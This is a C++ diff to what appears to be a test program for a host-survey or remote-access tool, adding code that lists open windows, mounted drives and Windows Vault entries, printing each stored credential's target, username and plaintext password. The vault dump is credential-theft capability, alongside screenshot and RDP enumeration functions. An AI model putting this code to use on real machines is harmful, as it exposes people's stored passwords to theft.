@@ -51,6 +51,26 @@ void getSystemInfo()
 		printf(" - %s : %s\n", rdp.username.c_str(), rdp.server.c_str());
 	}
 
+	printf("Windows:\n");
+	std::list<std::string> window_list = host.list_windows();
+	for (std::list<std::string>::iterator iterator = window_list.begin(), end = window_list.end(); iterator != end; ++iterator)
+	{
+		printf(" - %s\n", (*iterator).c_str());
+	}
+
+	printf("Mounts:\n");
+	std::list<MountPoint> mount_list = host.list_mounts();
+	for (std::list<MountPoint>::iterator iterator = mount_list.begin(), end = mount_list.end(); iterator != end; ++iterator)
+	{
+		wprintf(L" - %s: %s\n", (*iterator).name.c_str(), (*iterator).path.c_str());
+	}
+
+	printf("Vault\n");
+	std::list<VaultEntry> vault_list = host.list_vault();
+	for (std::list<VaultEntry>::iterator iterator = vault_list.begin(), end = vault_list.end(); iterator != end; ++iterator)
+	{
+		wprintf(L" - %s => %s (%s) => \"%s\"\n", (*iterator).target.c_str(), (*iterator).username.c_str(), (*iterator).comment.c_str(), (*iterator).password.c_str());
+	}
 }
 
 void screenshot(const char* path)
@@ -364,9 +384,9 @@ void test_spawn()
 
 int main()
 {
-	/*
+	
 	getSystemInfo();
-
+	/*
 	printf("\n==========================================\n\n");
 
 	screenshot("screenshot.png");
@@ -377,7 +397,7 @@ int main()
 
 	printf("\n==========================================\n\n");
 	*/
-	listProcesses();
+	//listProcesses();
 	/*
 	printf("\n==========================================\n\n");
 
